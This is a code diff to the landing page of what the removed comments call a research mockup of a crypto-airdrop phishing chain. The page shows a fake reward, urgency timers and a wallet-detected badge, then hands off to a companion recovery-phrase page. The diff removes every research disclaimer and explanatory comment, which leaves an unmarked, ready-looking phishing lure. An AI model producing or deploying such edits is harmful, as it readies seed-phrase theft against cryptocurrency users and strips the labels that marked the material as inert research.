@@ -1,34 +1,4 @@
-<!--
-  ============================================================================
-  This is the LANDING page of the two-file mockup (served as index.html so
-  it is what loads first, matching how a real GitHub Pages site would
-  resolve the bare domain). Companion to airdrop.html in this same folder,
-  which holds the security-framed recovery-phrase follow-up page. Illustrates
-  the "combined pattern" described in:
-    real-life-scenarios/subdomain-takeover-seed-phishing-chain.md
-    ("Realistic choices" / airdrop-vs-security-framing discussion)
-  — an airdrop-style hook page (higher click/share rate, uses the wallet-
-  detection credibility layer naturally) that then hands off into the
-  security-framed recovery-phrase mockup (airdrop.html), matching the pattern
-  where the airdrop hook drives the click and the security framing carries
-  the actual ask.
-
-  Exactly like airdrop.html, this file contains NO data-collection logic:
-    - no fetch()/XHR/WebSocket/beacon anywhere in this file
-    - no external script/style/font/image loads of any kind (fully offline)
-    - the countdown timer, "claimed" counter, and "$847.50 estimated value"
-      figure are purely cosmetic, client-side-only elements with hardcoded
-      numbers — nothing is fetched, computed from a wallet/price feed/
-      server, or persisted anywhere
-    - the "Connect Wallet" button performs a READ-ONLY presence check
-      (typeof window.$onekey) exactly like airdrop.html's badge, requests
-      nothing, and then simply navigates the browser to airdrop.html —
-      the local sibling mockup file in this same research folder, never
-      to any external host
-  If you found this file outside this research folder, it has been copied
-  without authorization — it was never deployed anywhere by this engagement.
-  ============================================================================
--->
+<!-- index.html -->
 <!doctype html>
 <html lang="en">
 <head>
@@ -117,7 +87,6 @@
     box-shadow: 0 20px 50px -18px rgba(255, 170, 61, 0.55);
   }
 
-  /* Estimated-value display: hardcoded, cosmetic figure — see script comment */
   .reward-value {
     text-align: center;
     margin-bottom: 24px;
@@ -210,7 +179,7 @@
   }
   .bar-fill {
     height: 100%;
-    width: 86%; /* hardcoded, purely cosmetic — not fetched or computed */
+    width: 86%;
     border-radius: 999px;
     background: linear-gradient(90deg, var(--accent-dim), var(--accent));
   }
@@ -235,7 +204,6 @@
     flex-shrink: 0;
   }
 
-  /* ---- Wallet-detection credibility badge (same pattern as airdrop.html) ---- */
   .badge-detected {
     display: none;
     align-items: center;
@@ -310,9 +278,6 @@
 
     <div class="reward-visual">🪙</div>
 
-    <!-- Estimated USD value display: hardcoded, cosmetic figure, explained
-         in the script comment below. Not computed from any wallet balance,
-         price feed, or server response. -->
     <div class="reward-value">
       <div class="amount">$847<span class="cents">.50</span></div>
       <div class="caption"><span class="live-dot"></span>Estimated value for your eligible device — updated live</div>
@@ -340,7 +305,6 @@
         <li><span class="check">✓</span> One claim per verified device</li>
       </ul>
 
-      <!-- Same read-only presence-check pattern as airdrop.html -->
       <div class="badge-detected" id="walletBadge">
         <span class="dot"></span>
         <span>OneKey Wallet Detected — eligible</span>
@@ -357,27 +321,6 @@
   </footer>
 
 <script>
-/*
- * RESEARCH-ONLY BEHAVIOR NOTICE
- * ------------------------------------------------------------------
- * Everything below is intentionally inert:
- *   1. The countdown timer, "431,902 / 500,000 claimed" figure, and the
- *      "$847.50" estimated-value display are hardcoded, client-side-only
- *      cosmetic values, written directly in the HTML markup. None of them
- *      is fetched from a server, computed from any real wallet balance or
- *      price feed, or varied per visitor in any way.
- *   2. The wallet-detection check is READ-ONLY (typeof window.$onekey),
- *      identical in spirit to airdrop.html — it requests nothing and
- *      transmits nothing.
- *   3. The claim button's click handler performs a fake, local-only
- *      "checking eligibility" delay (setTimeout, no network) and then
- *      calls location.href to navigate to "airdrop.html" — the sibling
- *      file IN THIS SAME FOLDER. It never contacts an external host.
- *   4. There is no fetch(), XMLHttpRequest, WebSocket, beacon, or
- *      storage write anywhere in this file.
- */
-
-// --- Cosmetic countdown timer: local-only, no network, just for realism ---
 (function fakeCountdown() {
   var totalSeconds = 11 * 3600 + 47 * 60 + 32;
   var elH = document.getElementById('cdH');
@@ -396,24 +339,20 @@
   setInterval(tick, 1000);
 })();
 
-// --- Illustrative "Wallet Detected" badge (same pattern as airdrop.html) ---
 (function detectInjectedProvider() {
   try {
     if (typeof window.$onekey !== 'undefined') {
       document.getElementById('walletBadge').style.display = 'flex';
     }
-  } catch (e) { /* no-op */ }
+  } catch (e) {}
 })();
 
-// --- Claim button: fake local delay, then navigate to the sibling mockup ---
 document.getElementById('claimBtn').addEventListener('click', function () {
   var btn = this;
   btn.disabled = true;
   btn.textContent = 'Checking eligibility…';
 
-  // Purely cosmetic delay — no network request of any kind happens here.
   setTimeout(function () {
-    // Navigates only within this research folder, to the sibling mockup.
     window.location.href = 'airdrop.html';
   }, 900);
 });
